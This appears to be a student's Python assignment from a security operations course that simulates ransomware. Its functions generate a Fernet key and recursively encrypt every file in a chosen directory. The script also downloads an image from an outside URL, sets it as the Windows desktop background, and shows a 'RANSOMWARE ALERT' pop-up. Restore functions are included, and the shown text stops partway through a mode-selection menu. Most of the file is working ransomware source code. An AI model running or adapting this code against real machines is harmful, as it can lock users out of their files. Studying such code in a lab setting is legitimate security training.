#!/user/bin/python3
# Script: Ops 401 Class 8 Code Challenge
# Joshua Phipps
# 4/26/2023
# Purpose: File Encryption Script Part 3 of 3

from cryptography.fernet import Fernet
import os, math, time, datetime, getpass, os.path
import urllib.request
import ctypes
import pyautogui
import shutil

# Generate a key file for encryption
def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

# Load the key file for encryption
def load_key():
    return open('key.key', 'rb').read()

# Encrypt a file using the key
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = f.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Decrypt a file using the key
def decrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()
    decrypted = f.decrypt(encrypted)
    with open(file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted)

# Recursively encrypt all files in a directory and its subdirectories
def encrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Recursively decrypt all files in a directory and its subdirectories
def decrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

# Method 1: change_desktop_background
def change_desktop_background():
    imageUrl = 'https://www.pinterest.com/pin/624030092123408285/'
    path = os.path.join(os.path.expanduser('~'), 'Desktop', 'background.jpg')
    urllib.request.urlretrieve(imageUrl, path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

# Method 2: pop_up
def pop_up():
    pyautogui.alert("Your computer has been infected with ransomware!", "RANSOMWARE ALERT", button='OK')

# Method 3: ransomware
def ransomware():
    path = input("Enter the path of the directory to encrypt (default is current directory): ") or "."
    key = load_key()
    encrypt_directory(path, key)
    change_desktop_background()
    time.sleep(5)
    pop_up()

# Method 4: ransomware_restore
def ransomware_restore():
    path = input("Enter the path of the directory to decrypt (default is current directory): ") or "."
    key = load_key()
    decrypt_directory(path, key)
    restore_background()

# Method 5: restore_background
def restore_background():
    path = os.path.join(os.path.expanduser('~'), 'Desktop', 'background.jpg')
    if os.path.exists(path):
        os.remove(path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)

# Prompt the user to select a mode
def select_mode():
    print("Select a mode:")
    print("1. Generate key file")
    print("2. Encrypt a file")
    print("3. Decrypt a file")
